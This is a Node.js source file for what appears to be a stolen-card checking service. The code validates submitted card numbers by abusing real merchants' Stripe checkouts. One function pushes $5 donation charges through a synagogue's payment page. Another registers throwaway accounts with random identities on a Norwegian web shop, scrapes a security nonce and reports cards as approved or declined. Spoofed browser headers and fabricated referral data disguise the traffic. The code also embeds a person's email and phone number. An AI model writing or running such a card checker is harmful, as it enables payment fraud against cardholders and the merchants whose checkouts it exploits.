const { isLuhnValid } = require("../helps/index.js");
const axios = require('axios');
const cheerio = require('cheerio');

const stripeCharges = async (req, res) => {
  const { cardNumber, cardExpiry, cardCvv } = req.body

  async function CheckCard() {
    try {
      const isCardNumberValid = isLuhnValid(cardNumber);
      if (!isCardNumberValid) {
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: "invalid_card_number",
          error: true,
        })
      }
      const cardExpiryMes = cardExpiry.split('|')[0]
      const cardExpiryAnio = cardExpiry.split('|')[1]
      // console.log(cardNumber)
      // console.log(cardExpiryMes)
      // console.log(cardExpiryAnio)
      // console.log(cardCvv)

      const url = "https://api.stripe.com/v1/tokens";
      const headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
      };

      const data = new URLSearchParams({
        "guid": "b094041a-9d93-47ac-808b-67fa048c9c79cffbe1",
        "muid": "1bbbe87e-aacf-4839-81c5-ae1b8414091b045ffd",
        "sid": "01a17e99-14b8-47f2-b0fd-ed73b7f975f10eaf1e",
        "referrer": "https://adath.com",
        "time_on_page": 116704,
        "card[number]": cardNumber,
        "card[cvc]": cardCvv,
        "card[exp_month]": cardExpiryMes,
        "card[exp_year]": cardExpiryAnio,
        "card[address_zip]": "10090",
        "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
        "key": "pk_live_hfa8n6GiIulubXWLlxKFT2Nk00HemDDv0u",
        "pasted_fields": "number"
      });

      const response = await axios.post(url, data.toString(), { headers });
      const stripeToken = response.data.id
      // console.log(stripeToken);

      const urlCharge = "https://adath.com/pay/charge";
      const headersCharge = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
      };
      const dataCharge = new URLSearchParams({
        "first-name": "Raul",
        "last-name": "Asencio",
        "email": "juanjosea102@gmail.com",
        "phone": "6674278938",
        "amount": "USD 5.00",
        "note": "",
        "description": "Donation",
        "stripeToken": stripeToken
      });

      const responseCharge = await axios.post(urlCharge, dataCharge.toString(), { headers: headersCharge });
      // console.log('response', responseCharge.data);
      // console.log("STATUS CODE:", responseCharge.status);
      // console.log("HTML LENGTH:", responseCharge.data.length);
      // console.log("HTML PREVIEW:", responseCharge.data.slice(0, 500));
      if (responseCharge.status === 200) {
        console.log("Cargando cheerio...")
        const $ = cheerio.load(responseCharge.data);

        const excludeTexts = [
          "Adath Israel Synagogue2337 Edgcumbe RoadSt. Paul, Minnesota 55116-2766",
          "CALL651-698-8300FAX 651-690-1144",
          "Rabbi Asher Zeilingoldrabbiz@adath.com"
        ];

        $('h4').each((index, element) => {
          const text = $(element).text().trim();
          if (!excludeTexts.includes(text)) {
            console.log(`MENSAJE: "${text.toUpperCase()}"`);
          }
        });

        $('p').each((index, element) => {
          const text = $(element).text().trim();
          if (!excludeTexts.includes(text)) {
            console.log(`MENSAJE: "${text.toUpperCase()}"`);
          }
        });
      } else {
        console.log(`ERROR EN LA SOLICITUD: ${responseCharge.status}`);
      }

      setTimeout(async () => {
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: 'TimeoutError',
          error: true
        });
      }, 17000);
      // return res.json({
      //   card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
      //   status: 'TimeoutError',
      //   error: true
      // });
    } catch (error) {
      console.log(error);
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
        status: "Ocurrio un error",
        error: true
      })
    }
  }
  return await CheckCard();
};

const stripeAuth = async (req, res) => {
  const { cardNumber, cardExpiry, cardCvv } = req.body

  async function CheckCard() {
    try {
      const isCardNumberValid = isLuhnValid(cardNumber);
      if (!isCardNumberValid) {
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: "invalid_card_number ❌",
          error: true,
        })
      }

      // Fetch random user data
      const randomUserUrl = "https://randomuser.me/api/?results=1&nat=US";
      const randomUserResponse = await axios.get(randomUserUrl);
      const userInfo = randomUserResponse.data.results[0];
      const email = userInfo.email;
      const zipcode = userInfo.location.postcode;

      // Create a session with cookies (simulated in Node.js with axios)
      const session = axios.create({
        withCredentials: true,
      });

      // URL of the page
      const url = "https://www.scandictech.no/my-account/";

      const data = {
        "email": email,
        "wc_order_attribution_source_type": "referral",
        "wc_order_attribution_referrer": "https://web.telegram.org/",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "web.telegram.org",
        "wc_order_attribution_utm_medium": "referral",
        "wc_order_attribution_utm_content": "/",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://www.scandictech.no/",
        "wc_order_attribution_session_start_time": "2025-05-02 02:22:31",
        "wc_order_attribution_session_pages": "13",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "woocommerce-register-nonce": "aef6c11c3b",
        "_wp_http_referer": "/my-account/",
        "register": "Register"
      };

      const headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.7",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.scandictech.no",
        "referer": "https://www.scandictech.no/my-account/",
        "sec-ch-ua": '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
      };

      const postResponse = await session.post(url, new URLSearchParams(data).toString(), { headers });
      // console.log(postResponse)

      // Get the add-payment-method page
      const addPaymentMethodUrl = "https://www.scandictech.no/my-account/add-payment-method/";
      const addPaymentMethodResponse = await session.get(addPaymentMethodUrl, { headers });

      // Extract the nonce
      const $ = cheerio.load(addPaymentMethodResponse.data);
      let nonce = null;
      $('script').each((index, script) => {
        const scriptContent = $(script).html();
        if (scriptContent && scriptContent.includes("createAndConfirmSetupIntentNonce")) {
          const start = scriptContent.indexOf("createAndConfirmSetupIntentNonce") + "createAndConfirmSetupIntentNonce".length + 3;
          const end = scriptContent.indexOf('"', start);
          nonce = scriptContent.substring(start, end);
        }
      });

      if (!nonce) throw new Error("Nonce not found");

      // Make the POST request to Stripe
      const stripeUrl = "https://m.stripe.com/6";
      const stripeResponse = await session.post(stripeUrl, {}, { headers });

      const stripeJson = stripeResponse.data;
      const guid = stripeJson.guid || '';
      const muid = stripeJson.muid || '';
      const sid = stripeJson.sid || '';


      // Stripe payment method creation
      const paymentMethodsUrl = "https://api.stripe.com/v1/payment_methods";
      const paymentMethodsData = new URLSearchParams({
        "type": "card",
        "card[number]": cardNumber,
        "card[cvc]": cardCvv,
        "card[exp_year]": cardExpiry.split('|')[1],
        "card[exp_month]": cardExpiry.split('|')[0],
        "allow_redisplay": "unspecified",
        "billing_details[address][postal_code]": zipcode,
        "billing_details[address][country]": "US",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/e01db0f08f; stripe-js-v3/e01db0f08f; payment-element; deferred-intent",
        "referrer": "https://www.scandictech.no",
        "time_on_page": "67182",
        "client_attribution_metadata[client_session_id]": "7cbca304-99b4-4e6f-a571-b689a496a462",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "key": "pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf",
        "_stripe_version": "2024-06-20",
      }).toString();

      const paymentMethodsResponse = await session.post(paymentMethodsUrl, paymentMethodsData, {
        headers: {
          ...headers,
          "accept": "application/json",
          "content-length": paymentMethodsData.length,
        },
      });

      const paymentMethodsJson = paymentMethodsResponse.data;
      const paymentMethodId = paymentMethodsJson.id;

      const confirmSetupIntentUrl = "https://www.scandictech.no/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
      const confirmSetupIntentData = new URLSearchParams({
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": paymentMethodId,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
      }).toString();

      const confirmSetupIntentResponse = await session.post(confirmSetupIntentUrl, confirmSetupIntentData, { headers });

      const responseJson = confirmSetupIntentResponse.data;
      // console.log('response', responseJson)

      if (responseJson.success === false) {
        const errorMessage = responseJson.data.error.message || "Unknown error";
        // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : ${errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌"} , MESSAGE : ${errorMessage} ❌`);
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: errorMessage.includes("incorrect_address") ? "APPROVED AVS ✅" : "DECLINED ❌",
          message: errorMessage,
          error: true
        });
      } else if (responseJson.success === true) {
        const status = responseJson.data.status || "unknown";
        if (status === "requires_action") {
          // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED 3DS ✅ , MESSAGE : ${status} ❌`);
          return res.json({
            card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
            status: "APPROVED 3DS ✅",
            message: `${status} ❌`,
            error: false
          });
        } else {
          // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : APPROVED ✅ , MESSAGE : ${status} ✅`);
          return res.json({
            card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
            status: "APPROVED ✅",
            message: `${status} ✅`,
            error: false
          });
        }
      } else {
        // console.log(`${cardNumber}|${cardExpiry}|${cardCvv} , STATUS : UNKNOWN ❌ , MESSAGE : Respuesta inesperada del servidor.`);
        return res.json({
          card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
          status: "UNKNOWN ❌",
          message: "Respuesta inesperada del servidor.",
          error: true
        });
      }
    } catch (error) {
      console.log(error);
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry}|${cardCvv}`,
        status: `Ocurrio un error ${error}`,
        error: true
      })
    }
  }
  return await CheckCard();
};

module.exports = {
  stripeCharges,
  stripeAuth,
}

